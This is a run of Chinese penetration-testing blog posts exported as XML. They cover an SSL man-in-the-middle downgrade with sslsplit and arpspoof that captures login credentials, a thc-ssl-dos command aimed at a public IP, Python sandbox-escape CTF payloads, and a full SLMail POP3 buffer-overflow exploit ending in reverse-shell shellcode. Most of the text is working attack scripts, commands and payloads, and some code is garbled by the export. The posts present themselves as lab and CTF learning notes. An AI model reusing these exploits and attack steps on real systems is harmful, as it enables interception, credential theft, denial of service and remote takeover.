第三方网站扫描： www.ssllabs.com/ssltest 实际攻击的一些方法SSL/TLS中间人攻击（攻击者位于客户端和服务器通信链路中，中间人伪造证书进行加解密进行流量劫持） 这里举个例子，在我们使用代理工具的时候会在浏览器上面设置代理，但在真正的生产环境中我们是不可能将目标的浏览器代理设置为我们的地址，所以就要用到以下的方法 ARP欺骗（最常用的中间人攻击方式） DHCP（四步过程中的第一步一定是广播，谁先相应先给谁确认） 修改网关（手动修改，理论上成立，在现实环境中很难实现） 修改DNS 修改HOSTS（手动修改的这几个在生产环境中实现的条件非常苛刻） ICMP、STP（交换树协议，避免逻辑环路，实现高可用）、OSPF（攻击者和被攻击者出于同一个局域网可以通过攻击一些网络协议） 通过伪造CA证书实现SSL中间人攻击的原理图： 实现SSL中间人攻击的前提（如果SSL中间人攻击以后客户端不提示一些告警信息，用户是很难发现被攻击的） 客户端已经信任伪造证书颁发机构 攻击者控制了合法的证书颁发机构 客户端程序禁止了显示证书错误告警信息 攻击者已经控制客户端，并强制其信任伪造证书 SSLsplit（只需要在攻击者的机器上配置好以后就可以实现对经过的流量解密，也称为HTTPS降级攻击） 透明的SSL/TLS中间人攻击工具 对客户端伪装成服务器，对服务器伪装成普通客户端 伪装服务器需要伪造证书（这里就需要在本地生成一张伪造证书） 支持SSL/TLS加密的SMTP、POP3、FTP等通信中间人攻击（不仅限于https解密） 攻击原理： 监听https流量，更改重定向连接中的location，替换https为http并记录；更改响应内容中的超链接，替换https为http并记录；与用户进行http通信、与服务器进行https通信（记录中本应该是https的请求），从而获取用户信息。 使用openssl伪造中间人的证书： 使用OpenSSL生成证书私钥：openssl genrsa -out ca.key 2048 现在主要使用的就是2048或4096位 利用私钥签名生成证书： openssl req -new -x509 -days 1096 -key ca.key -out ca.crt （这个证书就是伪造的中间人的根证书，伪造信息的时候仅可能的真实） 这里生成的根证书会被sslsplit调用生成通信的证书 开启中间人机器的路由功能（实现真正的路由转发，相当于一个路由器） sudo sysctl -w net.ipv4.ip_forward=1 修改的文件在 /proc/sys/net/ipv4/ip_forward 配置iptables规则实现端口转发调用证书：（因为sslsplit工作在特定的端口上） 查看80、443端口是否被占用 netstat -pantu | grep 80 netstat -pantu | grep 443` 查看当前防火墙中的nat规则 sudo iptables -t nat -L 12345678980端口重定向到8080端口sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080443端口重定向到8443端口sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443将邮件提交代理（MSA）、SMTPS、IMAPS、POP3S重定向到8443端口(可以将加密的流量都转发)sudo iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443sudo iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443sudo iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443sudo iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443 使用一台WIN7的虚拟机进行arp欺骗： sudo arpspoof -i ens33 -t 192.168.240.131 -r 192.168.240.2 查看win7的Mac地址发现已经被欺骗 开启sslsplit监听端口（sslsplit的作用是调用伪造证书服务器根证书(ca.crt)针对不同网站签发不同的证书，比如：针对百度伪造类似百度的证书，针对淘宝伪造类似淘宝的证书 ） 建立一个数据存放目录： mkdir -p test1/logdir sudo sslsplit -D -l connect.log -j /home/toml/test1/ -S logdir -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 可以看到生成证书的内容 当被劫持的客户端访问一些做了https的网站，比如淘宝，客户端输入的一些数据经过sslsplit就会被降级解密，理论上是这样，但是现在出现一个尴尬的情况：开启流量转发后arp欺骗也成功了，结果客户端不能正常访问页面。通过分析是https降级失败。 重新进行了https降级，客户端访问页面出现证书不受信任的警告： 在客户端访问做了全站https的淘宝并模拟登陆：（并在logdir目录下查看传输数据的记录） 匹配输入账号密码的字符 sudo grep 123123 * 并查看文件，发现数据都可以明文查看到 HTTPS结合伪造证书降级攻击成功，如果是在真实环境中，为了完美的攻击，可以将伪造的根证书传到客户端浏览器上，这样客户端就不会提示告警信息了。 SSL/TLS拒绝服务攻击 由于SSL在正式加密通信之前，会进行一个协商的机制，协商使用哪种加密套件等，协商成功以后建立SSL的通信，在这个过程中会产生大量的连接，在一定程度上https对会增大服务器的开销。 thc-ssl-dos（一个ssl dos工具，利用的SSL的安全重连接的特性，打死的不是带宽，而是服务器的资源，产生的流量很小，但是效果却很好） SSL协商加密对性能开销增大，大量握手请求会造成拒绝服务 利用SSL secure Renegotiation特性，在单一TCP连接中生成数千个SSL连接请求，造成服务器资源过载 与流量式拒绝服务(占用所有的带宽)攻击不同，thc-ssl-dos可以利用dsl线路打垮30G带宽的服务器 服务器平均可以处理300次/秒SSL握手请求 对SMTPS、POP3S等服务同样有效 thc-ssl-dos 199.233.209.205 2083 –accept 对策 禁用SSL-Renegotiation、使用SSL Accelerator 测试网站是否禁用了SSL-Renegotiation openssl s_client -connect 通过修改thc-ssl-dos代码，可以绕过以上对策 web其他知识点补充 AJAX Asynchronous JavaScript and XML 是一个概念，而非一种新的编程语言，是一组现有技术的组合 通过客户端脚本动态更新页面部分内容，而非整个页面 降低带宽使用，提高速度 提升用户体验 后台异步访问 AJAX组件 JavaScript：ajax的核心组件，使用XMLHTTPRequest对象接口像服务器发起请求，接收并处理服务器响应数据 DHTML 早于AJAX出现，通过JavaScript、css等在客户端修改HTML页面element，缺点是完全依赖于客户端代码修改页面，与服务器的交互由JavaScript applets完成，AJAX的XHR弥补了它的缺点（注册用户） DOM 处理html、xml文档对象的框架，DHTML是一个浏览器，DOM作为其一个实现的接口，定义和管理每个页面元素obj的properties、method、event 基于AJAX的WEB应用工作流程 XMLHTTPRequest API创建对象xmlhttp进行访问 xml、json、HTML、文本、图片 多个异步请求独立通信，互不依赖 AJAX框架 JQuery Dojo Toolkit Google web tookit(GWT) microsoft AJAX library AJAX攻击面不为大多数人所知 AJAX的安全问题 多种技术混合，增加了攻击面，每个参数都可能形成独立的攻击过程 AJAX引擎是个权功能的解释器，访问恶意站点可能后果严重，虽然浏览器有沙箱和SOP，但可被绕过 服务器、客户端代码结合使用产生混乱，服务器访问控制不当，将信息泄露 暴露应用程序逻辑 AJAX对渗透测试的挑战 异步请求数量多且隐蔽 触发AJAX请求的条件无规律 手动和截断代理爬网可能产生大量遗漏 AJAX爬网工具 OWASP_ZAP（在攻击模块中） 客户端代码审计 源码 firebug / f12 中的XHR WEB SERVICE 面向服务的架构，便于不同系统集成共享数据和功能 尤其适合不想暴露数据模和程序逻辑而访问数据的场景 无页面 两种类型的WEB service SOAP 传统的web service 开发方法，xml是唯一的数据交换格式 要求安全性的应用更多采用 RESTFUL 更多被采用的轻量web service,JSON是数据交换格式 WEB service安全考虑 使用的api key或session token实现和跟踪身份认证 身份认证有服务器完成，而非客户端 API key、用户名、session token永远不要通过URL发送 RESTful默认不提供任何安全机制，需要使用SSL/TLS保护传输数据安全 SOPA提供提供强于HTTPS的WS-security机制（在传输层实现数据加密） 使用OAuth 或 HMAX进行身份验证，HMAX身份认证使用C/S共享密钥加密API KEY RESTful应只允许身份认证用户使用PUT、DELETE方法 使用随机token防止CSRF攻击 对用户提交参数过滤，建议部署基于严格白名单的方法 报错信息消毒 直接对象引用应严格身份验证（电商公司已ID作为主索引）]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>parrot</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python沙盒逃逸学习]]></title>
    <url>%2F2018%2F06%2F11%2Fpython%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%2F</url>
    <content type="text"><![CDATA[由于在现在的比赛中出现了沙盒逃逸这种题目，所以就针对python沙盒逃逸学习记录如下。python沙盒逃逸的思路就是题目删除了一些不安全的内建函数，模块导致环境的权限被降低，要利用python语言的特性进行限制的绕过。同时借助前几天赛中的沙盒逃逸演示一下。比赛中涉及的到Python沙盒逃逸往往是利用语言特性来逃逸，但是其实这只是从Python解释器的逃逸，从严格意义上说这是不完全的。从现实意义上来讲更进一步的是利用沙盒的逃逸来控制整个系统，Python的模块通常都是大量C代码的封装，这里面就有未被发现的内存破坏漏洞。所以比赛的题目只是一种思路，更多的还是要结合到实际生产环境中。 实例一 实验脚本：题目的设置，删除一些内建函数（Python语言加载的时候会自动加载系统的内建模块，python2中是builtin，Python3中是builtins） 12345678910111213141516171819202122def make_secure(): UNSAFE = ['open','file','execfile','compile','reload','__import__','eval','input'] for func in UNSAFE: del __builtins__.__dict__[func] from re import findall #Remove dangerous builtinsmake_secure()print 'Go Ahead,Expoit me &gt; ;D'while True: try: print "&gt;&gt;&gt;", #Read user input until the first whitespace character inp = findall('\S+',raw_input())[0] a = None #Set a to the result from executing the user input exec 'a='+inp print '&gt;&gt;&gt;',a except Exception, e: print 'Exception:',e#后面这一段主要是将结果以字符串的形式操作并显示 脚本运行结果：（环境的限制权限非常低）这里其实就是模拟Python的命令行界面，然后进行相应的操作，只是将一些内建函数删除了，所以无法调用系统命令等等 正常情况下Python的使用可以调用OS等模块，就可以进行系统命令的调用和文件操作等等：但是经过限制以后的环境就不可以调用了，因此不能调用系统命令拿到flag 由于删除了对应的内建函数，所以我们要利用Python的特性来绕过这种限制：Python中可以利用file来read文件 但是我们可以发现直接用file这种方式也是被限制了的，所以利用对象的概念，通过元组来加载：（有一个知识点：bases : 类的所有父类构成元素（包含了一个由所有父类组成的元组）） 通过将所有父类组成的元组显示出来以后可以找到file在第40个，然后我们可以通过硬编码的方式调用file加载文件找到flag： ().__class__.__bases__[0].__subclasses__()[40](&#39;./flag.txt&#39;).read() 实例二 首先还是贴上环境的脚本，前提条件和实例一差不多：（不同的是这里能够执行的内建函数只有输入输出，与实例一不同的还有就是这里不回显数据 ） 1234567891011121314151617181920212223#!/usr/bin/pythonprint "Welcome to my python sandbox! Enter commands below!" banned = ['import','exec','eval','pickle','os','subprocess','kevin sucks','input','banned','cry sum more','sys'] targets = __builtins__.__dict__.keys()targets.remove('raw_input')targets.remove('print')for x in targets: del __builtins__.__dict__[x] while 1: try: print "&gt;&gt;&gt;", data = raw_input() for no in banned: if no.lower() in data.lower(): #将输入的字符转换为小写和banned中的字符转换为小写比较 print("Permission Denied") break exec data except: print '' 环境运行结果如下： 思路与实例一还是一样，都是使用所有父类组成的元组，这里要使用到catch_warnings类（索引在59），进行命令执行 print ().__class__.__bases__[0].__subclasses__() ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;ls&#39;) 经过测试以后发现这里其实可以不用执行59的那个子类，因为没有禁用print函数，当然这里的59这个子类可以用到实例一中进行ls的调用 print ().__class__.__bases__[0].__subclasses__()[40](&#39;./flag.txt&#39;).read() 实例三 实验环境代码如下：（这里用Python3写的，与前两个相比，这里先删除了两个危险的函数，然后对其他许多函数做了过滤，还对一些字符，如’.’都进行了过滤） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#-*-coding:utf-8-*-#!/usr/bin/python3 import sys, cmd, os del __builtins__.__dict__['__import__']del __builtins__.__dict__['eval'] intro= """ pwnhubcuit pwneverything Rules: -No import -No ... -No flag """ def execute(command): exec(command, globals()) class Jail(cmd.Cmd): prompt = '&gt;&gt;&gt; ' filtered ='\'|.|input|if|else|eval|exit|import|quit|exec|code|const|vars|str|chr|ord|local|global|join|format|replace|translate|try|except|with|content|frame|back'.split('|') def do_EOF(self, line): sys.exit() def emptyline(self): return cmd.Cmd.emptyline(self) def default(self, line): sys.stdout.write('\x00') def postcmd(self, stop, line): if any(f in line for f in self.filtered): print("You are a big hacker!!!") print("Go away") else: try: execute(line) except NameError: print("NameError: name'%s' is not defined" % line) except Exception: print("Error: %s" %line) return cmd.Cmd.postcmd(self, stop,line) if __name__ == "__main__": try: Jail().cmdloop(intro) except KeyboardInterrupt: print("\rSee you next time!") 所以这里就没有办法使用前面说的利用子类进行系统的调用，这里通过获取系统函数地址进行绕过： print(getattr(os, &quot;system&quot;)(&quot;ls&quot;)) print(getattr(os, &quot;system&quot;)(&quot;cat flag&quot;)) 以上三个实例就是利用Python作为脚本语言的特性来逃逸 实例四 拿最近一次比赛中的沙盒逃逸来演示一下。 拿到赛题以后nc连接一下并输入一些语句进行测试：（也是许多函数被限制且不回显，经过测试发现是Python2写的环境并且没有过滤‘ . ’） 这里和我们前面的练习不一样，这里必须要调用系统命令ls来看一下存放flag的文件，找到一个和getattr函数类似的函数getattribute print ().__class__.__bases__[0].__getattribute__(&#39;o&#39;+&#39;s&#39;,&#39;sy&#39;&#39;stem&#39;)(&#39;l&#39;&#39;s&#39;) 发现可以使用单引号调用参数 ().__class__.__bases__[0].__getattribute__(__import__(&#39;o&#39;+&#39;s&#39;),&#39;sy&#39;&#39;stem&#39;)(&#39;l&#39;&#39;s&#39;) 构造第二个payload，尝试使用导入os模块的方法调用系统命令，结果失败，过滤了os: 这个时候我们换一下思路，调用子类中的函数catch_warnings，在第59个，构造paylad: print [].__class__.__base__.__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39; + &#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;l&#39;&#39;s&#39;).read 成功列出了目录，经过测试flag在home/ctf目录下： print [].__class__.__base__.__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39; + &#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;l&#39;&#39;s /home&#39;).read() 然后我们加上getattribute构造payload： print [].__class__.__base__.__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39; + &#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;c&#39;&#39;at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb&#39;).read() 总结 利用语言特性来进行解释器的逃逸，其实就是绕过python沙盒内部导入模块的白名单；这里我理解为它限制的是语言中最直接的模块、函数的调用，而我们利用的是通过封装的类，以及派生出的子类调用，实现相同的功能。还有不得不说的一点，结合生产环境，通过内存破坏、溢出等方式实现沙盒的的逃逸要理解很多东西，涉及到二进制、fuzzy等等，所以要通过不断的学习才可以综合的利用。由于水平有限，这里只能做到语言解释器的沙盒逃逸，而不是系统层面的。下面给出一个讲利用内存破坏实现Python沙盒逃逸的链接。]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>CTF</tag>
        <tag>沙盒逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一次windows缓冲区溢出复现]]></title>
    <url>%2F2018%2F06%2F09%2F%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%2F</url>
    <content type="text"><![CDATA[缓冲区是内存中的一个片段，我们使用程序；在程序中输入一些参数、变量，这些都会先放在缓冲区中，然后通过CPU的调用、处理，然后再由计算机反馈出来。 程序的漏洞从哪里来： 罪恶的根源：变量 数据与代码边界不清（程序没有严格的限定） 由于控制不严会造成程序被严重的破坏 最简单漏洞原理——shell脚本 通过一个最简单的shell脚本来体现漏洞的由来： 这个脚本本意是将用户输入的字符显示出来，从程序的目的来看没有问题 12#！/bin/bashecho $ 但是这个程序没有做数据和命令上的过滤，通过一些特殊字符的构造就可以执行命令（比如； &amp;&amp; ||） 上面的结果就是一个简单的漏洞产生的原理，假如说这是一个服务器，攻击者就可以使用nc开一个监听端口，然后将shell重定向，这样就会直接控制服务器 缓冲区溢出： 当缓冲区边界限制不严格时，由于变量传入畸形数据或程序运行错误，导致缓冲区被“撑爆”，从而覆盖了相邻内存区域的数据。 成功修改内存数据、可以造成进程劫持、执行恶意代码、获得服务器权限等后果。 如何发现漏洞： 源码审计（首先你得能接触到源码） 逆向工程 模糊测试 向程序堆栈发送随机、半随机的数据，根据存在内存变化判断溢出 （完全随机的不好判断） 数据生成器：生成随机、半随机的数据 （工具） 测试工具：识别溢出漏洞 （工具，主要使用一些动态调试工具） Windows缓冲区溢出 FUZZER SLMail 5.5.0 Mail Server （一个Windows下的存在缓冲区溢出的服务端） ImmunityDebugger_1_85setup.exe （一个调试工具，比OD的自动化程度高一些） mona.py （辅助脚本） 环境：Windows XP（需要将SLMail 、调试工具部署好） 安装SLMail按照提示安装完查看端口、服务（smtp、pop3等）是否开放 安装调试工具，如果没有Python2.7环境它会自动安装 将mono.py放在ImmunityDebugger的Pycommands文件夹中 SLMail 5.5.0 Mail Server pop3 pass命令存在缓冲区溢出漏洞 无需身份验证实现远程代码执行 DEP：阻止代码从数据页被执行 （Windows的一种安全防护机制） ASLR：随机内存地址加载执行程序和DLL，每次重启地址变化 （Windows的一种安全防护机制） pop3 最简单的 110端口```123456789101112131415161718192021222324252627282930- 了解未知协议 - wireshark - RFC - 通过一个简单的Python脚本进行110端口的连接： ```python #!/usr/bin/python import socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) try: print "\nSending evil buffer..." s.connect(('192.168.111.137',110)) data = s.recv(1024) print data s.send('USER admin' + '\r\n') data = s.recv(1024) print data s.send('PASS admin\r\n') data = s.recv(1024) print data s.close() print "\nDone!" except: print "Could not connect to POP3!" 这里已知SLMail 5.5.0的pass存在缓冲区溢出漏洞，在实际测试用就需要一步步调试 测试pass命令接收到大量数据时是否合法 EIP寄存器存放下一条指令的地址 2.py （通过一个简单的Python脚本来验证SLMail 5.5.0的pass命令存在存在缓冲区漏洞） 123456789101112131415161718192021#!/usr/bin/pythonimport socket buffer = ["A"]counter = 100while len(buffer) &lt;= 50: buffer.append("A"*counter) counter = counter + 200 for string in buffer: print "Fuzzing PASS with %s bytes " % len(string) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect(('192.168.111.137',110)) s.recv(1024) s.send("USER test" + '\r\n') s.recv(1024) s.send('PASS ' + string + '\r\n') s.send('QUIT\r\n') s.close() #向目标的110端口发送大量的A 首先确保开启了pop3： 打开ImmunityDebugger并且开始调试pop3服务的这个进程，查看端口状态的时候可以看到PID是2696 准备就绪以后启动脚本发送数据： 当数据到2700bytes的时候会发现EIP EBP寄存器都是4141 assic码就是A，这个时候发送大量的A造成了PASS指定的溢出，证明溢出确实存在： 溢出存在，如果EIP指令可以修改，就可以通过一些构造，就可能执行一些系统命令；还有一种可能，通过修改EIP的地址，将指令指向一个内存地址空间，通过缓冲区溢出添加shellcode，然后控制服务器。 通过PASS缓冲区溢出漏洞的验证，发现在数据发送到2900bytes的时候溢出 通过第三个脚本精确的找到溢出的四个字节 123456789101112131415#!/usr/bin/pythonimport socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)buffer = 'A' * 2700 #因为前面是从2700开始溢出的try: print "\nSending evil buffer..." s.connect(('192.168.111.137',110)) data = s.recv(1024) s.send('USER test' + '\r\n') data = s.recv(1024) s.send('PASS ' + buffer + '\r\n') print "\nDone!"except: print "Could not connect to POP3!" 123456789101112131415#!/usr/bin/pythonimport socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)buffer = 'A' * 2600 #改为2800确定是否在 2800-2900之间try: print "\nSending evil buffer..." s.connect(('192.168.111.137',110)) data = s.recv(1024) s.send('USER test' + '\r\n') data = s.recv(1024) s.send('PASS ' + buffer + '\r\n') print "\nDone!"except: print "Could not connect to POP3!" 现在再看POP3的进程，仅管还是溢出了，但是EIP不是全A的状态了，就证明精确溢出的四个字节在2600-2700： 更加精确定位 二分法 唯一字符串法：如果可以生成唯一的字符串，就可以精确定位是那四个字节填充了EIP 通过一个脚本生成 /usr/share/metasploit-framework/tools/exploit/```12345678910111213141516171819202122232425262728293031 ```udo ./pattern_create.rb -l 2700``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/17607469.jpg)- 将生成的2700字符串替换上个脚本中的2700个A，然后重新测试，得到如下结果： ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/65730627.jpg)- EIP中的四个字节的HEX为：39 69 44 38 由于计算机中内存的分配和人的阅读习惯刚好相反 ：38 44 69 39；对应的ASSIC为：8Di9- 使用脚本查看着四个字节的偏移量： ```sudo ./pattern_offset.rb -q 39694438``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/50197101.jpg)- 然后修改前面的脚本，将偏移量2606的字符串设置为A，然后溢出的四个字节设置为B，其余的设置为C，这样确定精确查找是否正确： ```python #!/usr/bin/python import socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) buffer = &apos;A&apos; * 2606 + &apos;B&apos; * 4 + &apos;C&apos; * 80 try: print &quot;\nSending evil buffer...&quot; s.connect((&apos;192.168.111.137&apos;,110)) data = s.recv(1024) s.send(&apos;USER test&apos; + &apos;\r\n&apos;) data = s.recv(1024) s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;) print &quot;\nDone!&quot; except: print &quot;Could not connect to POP3!&quot; 通过查看EIP的数据：42424242 刚好是4个B，证明前面测试出的偏移量2606是正确的。这里就可以确定我们可以利用这里的精确修改EIP中的指定达到利用PASS缓冲区溢出的漏洞。 现在已经可以精确修改寄存器中的内容，被修改的寄存器有EIP（重点关注）、EBP、ESP；接下来的思路：将EIP修改为shellcode代码的内存地址，将shellcode写入该地址空间（ESP），程序读取EIP寄存器中的数值，然后跳转到shellcode代码段并执行 寻找可存放shellcode的内存空间 通过脚本来探测ESP寄存器的大小： 123456789101112131415#!/usr/bin/pythonimport socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)buffer = 'A' * 2606 + 'B' * 4 + 'C' * 890try: print "\nSending evil buffer..." s.connect(('192.168.111.137',110)) data = s.recv(1024) s.send('USER test' + '\r\n') data = s.recv(1024) s.send('PASS ' + buffer + '\r\n') print "\nDone!"except: print "Could not connect to POP3!"![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/9248235.jpg) 然后查看esp中C的结束地址：（通过计算可以得出esp的空间大小为四百多，可以放下一个shellcode） 由于不同类型的程序、协议、漏洞、会认为一些字符是坏字符，这些字符有固定用途 返回地址、shellcode、buffer都不能出现坏字符 null byte (0x00) 空字符、用于终止字符串的拷贝操作 return （0x0D）回车操作，表示POP3 PASS命令输入完成 思路：发送0x00——0xff 256个字符，查找所有坏字符 123456789101112131415161718192021222324252627282930313233#!/usr/bin/pythonimport socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0b\x0c\x0d\x0e\x0f\x00""\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x10""\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x20""\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x30""\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\4e\x4f\x40""\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x50""\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x60""\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x70""\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x80""\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x90""\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xa0""\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xb0""\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xc0""\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xd0""\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xe0""\xe1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\xf0")buffer = 'A' * 2606 + 'B' * 4 + badcharstry: print "\nSending evil buffer..." s.connect(('192.168.111.137',110)) data = s.recv(1024) s.send('USER test' + '\r\n') data = s.recv(1024) s.send('PASS ' + buffer + '\r\n') print "\nDone!"except: print "Could not connect to POP3!" 这里我们可以发现ESP寄存器中没有内容了，然后follow in dump 查看具体位置，发现数据一直到0A的时候就异常了，然后修改脚本，删去0A，通过这种方法找到三个坏字符：0A 0D 00 理论上这个时候就可以进行数据的重定项了，将EIP的内容改为ESP的地址，但实际上是ESP的地址是变化的，所以这样就没有办法做重定向，硬编码不可行，这里就需要变通思路： 在内存中寻找地址固定的系统模块 在模块中寻找JMP ESP（内存地址固定不变）指令的地址跳转，再由该指令间接跳转到ESP，从而执行shellcode mono.py脚本识别内存模块，搜索return address 是JMP ESP指令的模块 寻找无DEP、ALSR保护的内存地址 内存地址不含坏字符 配置好调试工具，启动mono脚本：modules```12345678910111213141516 ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/86872565.jpg) 我们可以发现系统正在运行的模块都出现了，那么如何找到合适的模块呢，先介绍一下上面的参数 rebase（操作系统重启以后是否发生变化，如变化，则为true，否则为false）这里寻找false的 safeseh aslr nxcompat 是操作系统的安全机制，都选false,true的是带有保护机制的，内存地址都是随机的。 OS dll表示每个操作系统都有的这里都选为TRUE- 由于计算机内存中存储的是二进制，汇编指令肯定是无法查找的，所以通过工具将汇编指令转换成二进制： ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/17531204.jpg)- 然后我们进行jmp esp的查找，由于调试工具数据是十六进制，所以需要以十六进制的形式进行查找：```! mona find -s &quot;\xff\xe4&quot; -m slmfc.dll 很遗憾，这个模块里面没有，换其他模块，然后就可以找到可利用的：-s "\xff\xe4" -m slmfc.dll```1234567891011121314151617181920212223242526272829303132333435 ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/37554586.jpg)- 然后我们双击第一个模块，然后以汇编指令显示就会发现FFES: jmp esp ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/52427619.jpg)- 在jmp esp指令这里设置断点：（主要是为了利用脚本向跳转的这里发送溢出的代码，验证是否正常可以跳转） ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/8694262.jpg)- 然后我们修改前面精确溢出的代码，溢出的四个字节改为这里设置断点的内存地址，也就是jmp esp ，在添加390个C，也就是说：当程序执行到这jmp esp的时候，跳到ESP寄存器，然后将390个C存入ESP中 - 首先我们可以看到jmp esp的地址为：5F 4A 35 8F ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/38278009.jpg) - 然后我们在脚本里构造溢出的内容为这个地址，由于计算机读取数据和人读是相反的，所以要将地址反过来构造： ```python #!/usr/bin/python import socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) buffer = &apos;A&apos; * 2606 + &apos;\x8f\x35\x4a\x5f&apos; + &apos;C&apos; * 390 try: print &quot;\nSending evil buffer...&quot; s.connect((&apos;192.168.111.137&apos;,110)) data = s.recv(1024) s.send(&apos;USER test&apos; + &apos;\r\n&apos;) data = s.recv(1024) s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;) print &quot;\nDone!&quot; except: print &quot;Could not connect to POP3!&quot; 然后发送数据，查看EIP和ESP的内容：（发现确实跳转了，EIP的内容为跳转的地址，存储C也是在ESP中执行了，说明我们可以执行shellcode） 按F7执行下一步，发现又跳转到EIP： 现在解决了ESP的地址跳转问题，我们就可以进一步构造shellcode执行，进行系统的控制： 生成shellcode scratch （可以用这个去自己写） 用msfpayload生成shellcode -l``` 查看所有的payload1234567891011121314151617181920212223242526272829303132333435363738394041424344454647 - ```sudo ./msfpayload win32_reverse LHOST=192.168.111.140 LPORT=4444 C``` 用反向连接的这个载荷，C表示的是C语言格式，但是生成以后我们发现存在坏字符，所以shellcode不能使用 - ```sudo ./msfpayload win32_reverse LHOST=192.168.111.140 LPORT=4444 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;``` 这里使用msfemcode对三个字符进行转义，R是保证msfemcode可以使用、 ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/15011544.jpg)- 将shellcode加入代码中： ```python #!/usr/bin/python import socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) shellcode = ( &quot;\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xf7\x71\x2c&quot; + &quot;\xc1\x83\xeb\xfc\xe2\xf4\x0b\x1b\xc7\x8c\x1f\x88\xd3\x3e\x08\x11&quot; + &quot;\xa7\xad\xd3\x55\xa7\x84\xcb\xfa\x50\xc4\x8f\x70\xc3\x4a\xb8\x69&quot; + &quot;\xa7\x9e\xd7\x70\xc7\x88\x7c\x45\xa7\xc0\x19\x40\xec\x58\x5b\xf5&quot; + &quot;\xec\xb5\xf0\xb0\xe6\xcc\xf6\xb3\xc7\x35\xcc\x25\x08\xe9\x82\x94&quot; + &quot;\xa7\x9e\xd3\x70\xc7\xa7\x7c\x7d\x67\x4a\xa8\x6d\x2d\x2a\xf4\x5d&quot; + &quot;\xa7\x48\x9b\x55\x30\xa0\x34\x40\xf7\xa5\x7c\x32\x1c\x4a\xb7\x7d&quot; + 